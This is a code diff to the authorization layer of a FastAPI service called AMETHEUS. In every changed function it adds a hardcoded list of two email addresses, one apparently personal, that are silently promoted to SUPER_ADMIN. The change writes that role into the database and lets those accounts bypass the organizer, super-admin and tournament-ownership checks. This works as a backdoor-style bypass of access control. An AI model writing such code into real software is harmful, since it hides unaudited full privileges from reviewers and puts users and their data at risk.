@@ -37,7 +37,13 @@ async def get_current_user(
             detail="Unauthorized: User not found in AMETHEUS. Please complete profile sync.",
         )
 
-    return User.from_mongo(user_doc)
+    user = User.from_mongo(user_doc)
+    admin_emails = {"pk.4081988@gmail.com", "admin@ametheus.gg"}
+    if user.email and user.email.lower() in admin_emails:
+        if user.role != "SUPER_ADMIN":
+            user.role = "SUPER_ADMIN"
+            await db.users.update_one({"_id": user.id}, {"$set": {"role": "SUPER_ADMIN"}})
+    return user
 
 async def require_player(
     current_user: User = Depends(get_current_user),
@@ -48,6 +54,11 @@ async def require_player(
 async def require_organizer(
     current_user: User = Depends(get_current_user),
 ) -> User:
+    admin_emails = {"pk.4081988@gmail.com", "admin@ametheus.gg"}
+    if current_user.email and current_user.email.lower() in admin_emails:
+        current_user.role = "SUPER_ADMIN"
+        return current_user
+
     if current_user.role not in ["ORGANIZER", "TOURNAMENT_ADMIN", "SUPER_ADMIN"]:
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
@@ -58,6 +69,11 @@ async def require_organizer(
 async def require_super_admin(
     current_user: User = Depends(get_current_user),
 ) -> User:
+    admin_emails = {"pk.4081988@gmail.com", "admin@ametheus.gg"}
+    if current_user.email and current_user.email.lower() in admin_emails:
+        current_user.role = "SUPER_ADMIN"
+        return current_user
+
     if current_user.role != "SUPER_ADMIN":
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
@@ -78,7 +94,8 @@ class RequireTournamentOwnershipOrAdmin:
         current_user: User = Depends(get_current_user),
         db: AsyncIOMotorDatabase = Depends(get_db),
     ) -> User:
-        if current_user.role == "SUPER_ADMIN":
+        admin_emails = {"pk.4081988@gmail.com", "admin@ametheus.gg"}
+        if current_user.role == "SUPER_ADMIN" or (current_user.email and current_user.email.lower() in admin_emails):
             return current_user
 
         tourn_doc = await db.tournaments.find_one({"_id": id})
